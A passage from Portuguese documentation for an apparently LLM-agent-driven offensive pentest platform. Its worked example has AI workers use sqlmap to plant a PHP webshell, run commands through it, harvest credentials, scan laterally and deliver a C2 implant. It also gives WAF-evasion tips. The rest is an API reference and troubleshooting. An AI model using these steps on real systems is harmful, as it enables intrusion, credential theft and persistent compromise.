**O que cobre:** Teste de segurança de APIs REST e GraphQL — BOLA, BFLA, mass assignment, introspection.

---

### sqli-to-rce

**O que cobre:** SQLi → RCE via INTO OUTFILE, xp_cmdshell, stacked queries, OOB exfil.

---

### ssrf-to-rce

**O que cobre:** SSRF → RCE via IMDS, Redis SLAVEOF, internal admin panels, gopher protocol.

---

### file-upload-weaponize

**O que cobre:** Upload de arquivo → RCE — bypass de validação de tipo, double extension, polyglot.

---

### deserialize-chain

**O que cobre:** Desserialização insegura — Java (ysoserial), .NET (ysoserial.net), PHP (POP chains), Python (pickle).

---

## 10. CVEs em Escopo

| CVE | Produto | CVSS | Status | Alvo |
|-----|---------|------|--------|------|
| CVE-2026-115560 | PHP (`session.upload_progress.enabled=On`) | 8.1 | SEM PATCH (out 2026) | Qualquer PHP com default config |
| CVE-2026-109618 | PHP Session Upload RCE | 9.2 | Patched out 2026 (CISA KEV) | PHP < 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 |
| CVE-2026-109619 | PHP Session Upload variante | 9.2 | Patched out 2026 | Idem acima |
| CVE-2025-29927 | Next.js middleware bypass | 9.1 | Patched | `x-middleware-subrequest` header bypass |
| CVE-2025-1974 | Kubernetes IngressNightmare (ingress-nginx) | 9.8 | Patched | ingress-nginx com admission controller exposto |
| CVE-2025-55182 | React/Next.js RSC module ref | High | Sem patch estável | RSC decoder sem validação de module ref |
| CVE-2025-66478 | Next.js RSC pre-auth RCE | 10.0 | — | Root em CVE-2025-55182 |
| CVE-2024-49019 / ESC15 | ADCS certificate template abuse | High | — | Active Directory Certificate Services |
| CVE-2025-32711 | EchoLeak — M365 Copilot markdown exfil | High | — | M365 Copilot (Teams, Outlook, SharePoint) |
| CVE-2025-34291 | Langflow CSRF+CORS RCE | High | — | Langflow instâncias acessíveis a usuários auth |

---

## 11. Workflow Completo — Exemplo Real

### Cenário: black-box em app.target.com até VPS access (shell no servidor)

#### Etapa 1 — Configurar LLM

```bash
# No WSL, antes de iniciar:
export DEEPSEEK_API_KEY="sk-..."
bash scripts/run-artex.sh
```

Verificar: `curl http://localhost:8787/api/health`

Criar perfil DeepSeek no UI ou via API:

```bash
curl -X POST http://localhost:8787/api/llm \
  -H "Content-Type: application/json" \
  -d '{"format":"deepseek","model":"deepseek-chat","api_key":"sk-..."}'
```

#### Etapa 2 — Criar task com contexto completo

```bash
curl -X POST http://localhost:8787/api/tasks \
  -H "Content-Type: application/json" \
  -d '{
    "description": "Alvo: https://app.target.com. Aplicação web (Node.js + React). Scope: *.target.com. WAF: Cloudflare. Fora de scope: ações destrutivas, dados de usuários reais. Modo: black-box sem credenciais.",
    "goal": "Obter execução de código remoto no servidor de https://app.target.com — acesso shell, RCE via qualquer vetor web (SQLi, SSRF, upload, desserialização, LFI). Evidência mínima: output de id/whoami no servidor."
  }'
```

Anotar o `id` retornado (ex: `"id": "42"`).

#### Etapa 3 — Planner decompõe em fases

O `goals` agent extrai automaticamente:
- Goals: `["obter RCE no servidor de app.target.com"]`
- Constraints: `[{type:deny, text:"ações destrutivas"}, {type:deny, text:"dados de usuários reais"}]`
- Scope: `{kind:"subdomain", value:"app.target.com"}`

O Planner acorda e emite intents de recon: subfinder, httpx fingerprint, ffuf dirs, nuclei templates.

#### Etapa 4 — Workers fazem recon

Workers executam em paralelo:

```bash
# Exemplo de comandos que o worker executa via Bash:
subfinder -d target.com -all -recursive -o /tmp/subs.txt
httpx -l /tmp/subs.txt -title -status-code -tech-detect -threads 50 -o /tmp/httpx.json
ffuf -u https://app.target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403 -t 40 -o /tmp/ffuf.json
nuclei -u https://app.target.com -tags sqli,ssrf,rce,lfi -o /tmp/nuclei.txt
```

Assets são inseridos automaticamente. Facts são adicionados ao grafo.

#### Etapa 5 — Finding SQLi → escalação

Worker reporta: `add_finding("SQLi em GET /api/products?id= — error-based, coluna visível: mysql 8.0.33")`

Chat com MainAgent:

```
Você: "SQLi confirmada em /api/products — explora até RCE via INTO OUTFILE ou UDF"
```

MainAgent injeta intent de alta prioridade:

```
add_intent(
  priority=9,
  description="SQLi em /api/products?id= — escalação para RCE via INTO OUTFILE (escrever webshell) ou xp_cmdshell se MySQL/MSSQL. Skill: sqli-to-rce."
)
```

Worker usa skill `sqli-to-rce`:

```bash
# Testa INTO OUTFILE:
sqlmap -u "https://app.target.com/api/products?id=1" \
  --batch \
  --file-write /tmp/shell.php \
  --file-dest /var/www/html/uploads/shell.php \
  --dbms=mysql

# Verifica webshell:
curl "https://app.target.com/uploads/shell.php?cmd=id"
# → uid=33(www-data) gid=33(www-data)
```

Finding reportado: `RCE via SQLi→INTO OUTFILE — CVSS 9.8 — shell em /uploads/shell.php`

#### Etapa 6 — Post-exploitation

Chat com MainAgent:

```
Você: "Shell obtida. Verifica EDR, colhe creds e verifica movimento lateral"
```

Worker executa:

```
check_edr       → "Nenhum EDR detectado — processo: www-data, sem AV"
harvest_credentials → "Encontrou /var/www/.env com DB_PASSWORD=Pr0d_S3cur3_2026!"
lateral_scan    → "172.16.0.0/24: host 172.16.0.10 (porta 22 aberta, OpenSSH 8.9)"
save_task_credential(domain="app.target.com", username="www-data", password="[via shell]", note="webshell via SQLi")
```

C2 handoff (se em scope):

```
c2_stage_implant(arch="x64")      → implant disponível em staging
c2_deliver_implant(vector="webshell_upload", shell_url="https://app.target.com/uploads/shell.php")
c2_await_operator("app.target.com", "delivered")
```

#### Etapa 7 — Cleanup e relatório

Chat com MainAgent:

```
Você: "Limpa o webshell e o lixo em /tmp"
```

Worker executa `cleanup_artifacts`:

```bash
curl "https://app.target.com/uploads/shell.php?cmd=rm+-f+/var/www/html/uploads/shell.php"
# Remove sqlmap dumps locais
rm -rf /tmp/sqlmap-* /tmp/subs.txt /tmp/httpx.json /tmp/ffuf.json
```

Relatório final disponível em `Function → Tasks → 42 → Report`.

---

## 12. API Reference

### Autenticação

| Método | Path | Body/Params | Resposta |
|--------|------|------------|---------|
| GET | `/api/auth/status` | — | `{initialized: bool}` |
| POST | `/api/auth/init` | `{password}` | `{ok}` |
| POST | `/api/auth/login` | `{username, password}` | `{token}` |
| POST | `/api/auth/change-password` | `{current_password, new_password}` | `{ok}` |

Após login, envie `Authorization: Bearer <token>` em todas as requisições.

### Sistema

| Método | Path | Descrição |
|--------|------|-----------|
| GET | `/api/health` | Status + versão |
| GET | `/api/stats` | Estatísticas gerais |
| GET | `/api/logs` | Snapshot de logs |
| GET | `/api/logs/stream` | Stream SSE de logs ao vivo |
| GET | `/api/logs/history` | Histórico de logs |

### Tasks

| Método | Path | Body/Params | Descrição |
|--------|------|------------|-----------|
| GET | `/api/tasks` | — | Lista todas as tasks |
| POST | `/api/tasks` | `{description, goal}` | Cria task |
| GET | `/api/tasks/{id}` | — | Detalhes da task |
| PATCH | `/api/tasks/{id}` | `{name, ...}` | Atualiza metadados |
| DELETE | `/api/tasks/{id}` | — | Deleta task |
| POST | `/api/tasks/{id}/control` | `{action: "pause"\|"resume"\|"stop"}` | Controla lifecycle |
| POST | `/api/tasks/control/batch` | `{ids: [...], action}` | Controle em lote |
| GET | `/api/tasks/{id}/credentials` | — | Lista credenciais da task |
| POST | `/api/tasks/{id}/credentials` | `{domain, username, password, note}` | Adiciona credencial |
| DELETE | `/api/tasks/{id}/credentials/{cid}` | — | Remove credencial |
| GET | `/api/tasks/{id}/goals` | — | Lista goals da task |
| POST | `/api/tasks/{id}/goals` | `{text, vulnclass}` | Adiciona goal (revive task) |
| PATCH | `/api/tasks/{id}/goals/{gid}` | `{text}` | Edita goal |
| DELETE | `/api/tasks/{id}/goals/{gid}` | — | Remove goal |
| GET | `/api/tasks/{id}/constraints` | — | Lista constraints |
| POST | `/api/tasks/{id}/constraints` | `{type: "allow"\|"deny", text}` | Adiciona constraint |
| GET | `/api/tasks/{id}/scope` | — | Lista scope de assets |
| POST | `/api/tasks/{id}/scope` | `{kind, value}` | Adiciona scope |

### Exploração

| Método | Path | Descrição |
|--------|------|-----------|
| GET | `/api/exploration/findings` | Lista todos os findings |
| GET | `/api/exploration/findings/{id}` | Detalhe de finding |
| PATCH | `/api/exploration/findings/{id}` | Atualiza finding (status, notas) |
| DELETE | `/api/exploration/findings/{id}` | Remove finding |
| POST | `/api/exploration/findings/{id}/deepen` | Relança worker para aprofundar |
| POST | `/api/exploration/findings/{id}/retests` | Inicia retest |
| GET | `/api/exploration/graph` | Grafo completo (JSON) |
| GET | `/api/exploration/intents` | Lista intents do frontier |
| GET | `/api/exploration/activity` | Atividade recente |
| GET | `/api/exploration/activity/stream` | Stream SSE de atividade ao vivo |
| GET | `/api/exploration/tokens` | Estatísticas de uso de tokens |

### Chat / MainAgent

| Método | Path | Body | Descrição |
|--------|------|------|-----------|
| POST | `/api/chat` | `{message, task_id}` | Envia mensagem ao MainAgent |
| GET | `/api/tasks/{id}/chat/status` | — | Status do chat (em execução?) |
| POST | `/api/tasks/{id}/chat/stop` | — | Para o chat em execução |
| POST | `/api/chat/upload` | multipart/form-data `file` | Upload de arquivo para contexto |

### LLM

| Método | Path | Descrição |
|--------|------|-----------|
| GET | `/api/llm` | Configuração atual de LLM |
| POST | `/api/llm` | Define perfil LLM ativo |
| POST | `/api/llm/test` | Testa conectividade do perfil |

### Assets e Companies

| Método | Path | Descrição |
|--------|------|-----------|
| GET | `/api/assets` | Lista assets |
| POST | `/api/assets` | Insere assets |
| DELETE | `/api/assets` | Remove assets |
| GET | `/api/companies` | Lista companies |
| POST | `/api/companies` | Cria company |
| GET | `/api/companies/{id}` | Detalhe de company |
| DELETE | `/api/companies/{id}` | Remove company |

### Traffic (MITM)

| Método | Path | Descrição |
|--------|------|-----------|
| GET | `/api/traffic` | Lista tráfego registrado |
| GET | `/api/traffic/hosts` | Lista hosts com tráfego |
| GET | `/api/traffic/exchange` | Exchange completo (req+resp) |
| DELETE | `/api/traffic/all` | Limpa todo o tráfego |

### ProxyGraph

| Método | Path | Body | Descrição |
|--------|------|------|-----------|
| GET | `/api/proxygraph/nodes` | — | Lista nós do pool |
| POST | `/api/proxygraph/nodes` | `{id, url, tags}` | Adiciona nó |
| DELETE | `/api/proxygraph/nodes/{id}` | — | Remove nó |
| GET | `/api/proxygraph/health` | — | Health check do pool |
| GET | `/api/proxygraph/config` | — | Configuração atual |
| PUT | `/api/proxygraph/config` | `{policy}` | Define política de rotação |

### Skills

| Método | Path | Descrição |
|--------|------|-----------|
| GET | `/api/skills` | Lista skills disponíveis |
| POST | `/api/skills` | Cria nova skill |
| DELETE | `/api/skills/{name}` | Remove skill |
| GET | `/api/skills/{name}/files` | Lista arquivos da skill |
| GET | `/api/skills/{name}/files/{file...}` | Lê arquivo da skill |
| PUT | `/api/skills/{name}/files/{file...}` | Escreve arquivo da skill |

---

## 13. Troubleshooting

### Build falha — frontend não compilado

**Sintoma:** `binary reports embedui build tag missing` ou UI em branco ao abrir `:8787`

**Causa:** Binary compilado sem `-tags embedui` ou `server/webui/dist/` estava vazio.

**Solução:**

```bash
cd /mnt/c/Users/error/Desktop/ARTEX-main/ARTEX-main

# Rebuild completo:
cd web && npm ci && npm run build:static
cd ..
mkdir -p server/webui/dist
rsync -a --delete web/out/ server/webui/dist/
CGO_ENABLED=0 go build -tags embedui -trimpath -ldflags "-s -w" -o artex ./cmd/artex
```

---

### PostgreSQL não inicia no WSL

**Sintoma:** `connection refused` ao iniciar o ARTEX ou `no database config found`

**Causa:** WSL não roda systemd por padrão — PostgreSQL não auto-inicia.

**Solução:**

```bash
# Iniciar manualmente:
sudo pg_ctlcluster 16 main start
# ou:
sudo service postgresql start

# Verificar status:
sudo pg_ctlcluster 16 main status

# Se role/db não existem:
sudo -u postgres psql -c "CREATE ROLE artex LOGIN PASSWORD 'sua_senha';"
sudo -u postgres psql -c "CREATE DATABASE artex OWNER artex;"
```

**Para iniciar automaticamente com WSL**, adicione ao `~/.bashrc`:

```bash
if ! sudo service postgresql status >/dev/null 2>&1; then
  sudo service postgresql start
fi
```

---

### Workers não aparecem (task fica idle)

**Sintoma:** Task criada mas nenhum worker aparece na aba Sessions. Planner não acorda.

**Causa:** Nenhum perfil LLM configurado ou perfil ativo com erro.

**Diagnóstico:**

```bash
curl http://localhost:8787/api/llm
# Verificar se há perfil configurado e "active": true

curl -X POST http://localhost:8787/api/llm/test
# Deve retornar status 200 com lista de modelos
```

**Solução:**

1. `System → LLM → New profile` — configurar DeepSeek com API key válida
2. Clicar **Test** — deve mostrar `OK`
3. Clicar **Set as active**
4. Reiniciar a task: `POST /api/tasks/{id}/control {"action":"resume"}`

Se o perfil testa OK mas workers ainda não aparecem, checar logs:

```bash
curl http://localhost:8787/api/logs | grep -i "error\|llm\|planner"
```

---

### WAF bloqueando tudo (PolyEngine não resolve)

**Sintoma:** Workers reportam rejeições constantes, PolyEngine esgota 5 gerações sem sucesso.

**Diagnóstico:** Ver findings de bloqueio WAF + verificar qual WAF está ativo.

**Solução em camadas:**

1. **Identificar WAF:**

```bash
curl -si https://TARGET/ | grep -iE "cf-ray|x-amz-cf|via|x-cache|akamai|incapsula"
wafw00f https://TARGET/
```

2. **Adicionar proxies residenciais ao ProxyGraph** — IPs de data center são bloqueados por behavioral scoring:

```bash
curl -X POST http://localhost:8787/api/proxygraph/nodes \
  -H "Content-Type: application/json" \
  -d '{"id":"res-1","url":"http://user:pass@residential.provider.com:8080","tags":["residential"]}'
```

3. **Ativar skill waf-bypass** no worker — o planner injeta técnicas automaticamente

4. **Chat com MainAgent:**

```
"WAF Cloudflare bloqueando tudo. Usa skill waf-bypass com junk padding 16KB e method mutation — probe com TRACE primeiro"
```

5. **Para Cloudflare JS challenge:** usar Playwright stealth ou replay de cookie `cf_clearance` via MITM proxy

---

### MITM proxy não intercepta HTTPS

**Sintoma:** Tab Traffic mostra apenas HTTP, HTTPS aparece como tunnel.

**Causa:** CA do proxy não está instalada no browser/OS trust store.

**Solução:**

```bash
# Localizar o CA cert gerado automaticamente:
ls /mnt/c/Users/error/Desktop/ARTEX-main/ARTEX-main/data/

# O cert tem extensão .pem ou .crt. Instalar no Windows:
# 1. Copiar para Windows:
cp data/artex-ca.pem /mnt/c/Users/error/Desktop/artex-ca.pem

# 2. No Windows: duplo clique no .pem → Instalar certificado → Autoridades de Certificação Raiz Confiáveis

# 3. Configurar browser para usar proxy:
# Proxy: 127.0.0.1:8788
```

Para Burp Suite como upstream proxy do ARTEX:

```bash
# Editar config ou env para rotear ARTEX MITM → Burp:
export ARTEX_UPSTREAM_PROXY="http://127.0.0.1:8080"
```

---

### `go: command not found` após instalação

**Solução:**

```bash
source /etc/profile.d/artex-go.sh
# ou:
export PATH="/usr/local/go/bin:$HOME/go/bin:$PATH"
```

Para persistir:

```bash
echo 'source /etc/profile.d/artex-go.sh' >> ~/.bashrc
```

---

### Task fica travada em `running` sem progresso (stagnação)

**Sintoma:** Workers continuam acordando mas não produzem findings novos. O grafo mostra o aviso de stagnação.

**Solução:**

```bash
# Via chat:
"O que exatamente os workers estão tentando? Vejo stagnação."
# → MainAgent lê get_worker_output e explica

"Para de repetir SQLi no login — o WAF está bloqueando consistentemente. 
Muda o foco para SSRF nos endpoints de import. Usa skill ssrf-to-rce."
```

Via API — pausar e adicionar hint estratégico:

```bash
# Pausar:
curl -X POST http://localhost:8787/api/tasks/42/control \
  -d '{"action":"pause"}'

# Adicionar hint (operador pode fazer via chat mais facilmente):
curl -X POST http://localhost:8787/api/chat \
  -d '{"message":"Abandona SQLi. Foca SSRF em /api/import/url. Skill ssrf-to-rce.", "task_id":42}'

# Retomar:
curl -X POST http://localhost:8787/api/tasks/42/control \
  -d '{"action":"resume"}'
```

---

### Quota de tokens esgotada / rate limit LLM

**Sintoma:** Workers falham com `model_error`, task entra em retry backoff.

**O sistema faz automaticamente:**
- `modelErrorRetries = 2` reinicializações extras com backoff de 3s
- Failover para o próximo perfil na LLM chain da task

**Configurar LLM chain com failover:**

```bash
curl -X PUT http://localhost:8787/api/tasks/42/llm \
  -H "Content-Type: application/json" \
  -d '{"profile_ids": [1, 2], "rotate": false}'
```

Perfil 1 = deepseek-chat (principal), Perfil 2 = deepseek-reasoner (failover).

Para rotação round-robin entre perfis (distribuição de carga):

```bash
-d '{"profile_ids": [1, 2], "rotate": true}'
```
